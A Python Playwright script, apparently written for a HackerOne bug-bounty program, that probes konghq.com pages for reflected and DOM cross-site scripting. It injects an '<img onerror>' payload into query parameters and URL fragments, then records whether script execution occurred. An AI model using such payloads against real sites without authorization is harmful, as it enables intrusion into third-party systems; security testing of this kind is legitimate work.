#!/usr/bin/env python3
import json
import time
import urllib.parse
from pathlib import Path

from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError

TARGETS = [
    "https://konghq.com/",
    "https://developer.konghq.com/",
    "https://developer.konghq.com/search",
]
PARAMS = ["q", "query", "search", "s", "term", "keyword", "redirect", "next"]
MARKER = "H1KONGXSS_20260927"
PAYLOAD = '"><img src=x onerror="window.__H1_XSS=1">'

def test_url(page, url, phase):
    page.add_init_script("window.__H1_XSS = 0;")
    try:
        page.goto(url, wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(1500)
    except PlaywrightTimeoutError:
        pass
    except Exception as exc:
        return {"url": url, "phase": phase, "error": repr(exc)}

    try:
        reflected = bool(page.locator("html").inner_html(timeout=3000).find(MARKER) >= 0)
    except Exception:
        reflected = False
    try:
        executed = bool(page.evaluate("window.__H1_XSS === 1"))
    except Exception:
        executed = False

    return {
        "url": url,
        "phase": phase,
        "status": "executed" if executed else ("reflected" if reflected else "no_execution"),
        "reflected": reflected,
        "executed": executed,
        "title": page.title(),
        "final_url": page.url,
    }

def main():
    results = []
    findings = []

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        context = browser.new_context(
            user_agent="H1-Bounty-Agent/0.8 Kong public XSS research"
        )
        page = context.new_page()

        for base in TARGETS:
            for param in PARAMS:
                benign = base + ("&" if "?" in base else "?") + urllib.parse.urlencode({param: MARKER})
                r = test_url(page, benign, "reflection")
                results.append(r)

                if r.get("reflected") or r.get("status") == "executed":
                    exploit = base + ("&" if "?" in base else "?") + urllib.parse.urlencode({param: PAYLOAD})
                    x = test_url(page, exploit, "exploit")
                    results.append(x)
                    if x.get("executed"):
                        findings.append({
                            "type": "reflected_or_dom_xss",
                            "url": exploit,
                            "parameter": param,
                            "evidence": x,
                        })

        for base in TARGETS[:2]:
            exploit = base.split("#", 1)[0] + "#" + urllib.parse.quote(PAYLOAD, safe="")
            x = test_url(page, exploit, "fragment")
            results.append(x)
            if x.get("executed"):
                findings.append({
                    "type": "dom_xss_fragment",
                    "url": exploit,
                    "evidence": x,
                })

        browser.close()

    output = {
        "program": "kong",
        "tested_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "targets": TARGETS,
        "results": results,
        "findings": findings,
    }
    Path("kong-public-xss-results.json").write_text(json.dumps(output, indent=2), encoding="utf-8")

    if findings:
        lines = ["# VERIFIED POTENTIAL KONG XSS", ""]
        for item in findings:
            lines.append(f"- Type: {item['type']}")
            lines.append(f"- URL: {item['url']}")
            lines.append(f"- Evidence: {json.dumps(item['evidence'], ensure_ascii=False)}")
        Path("kong-public-xss-report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
        print("VERIFIED POTENTIAL XSS")
        for item in findings:
            print(json.dumps(item, ensure_ascii=False))
    else:
        Path("kong-public-xss-report.md").write_text(
            "# NO VERIFIED KONG XSS\n\n"
            "No tested query parameter or fragment caused JavaScript execution in the headless browser.\n",
            encoding="utf-8",
        )
        print("NO VERIFIED KONG XSS")

if __name__ == "__main__":
    main()
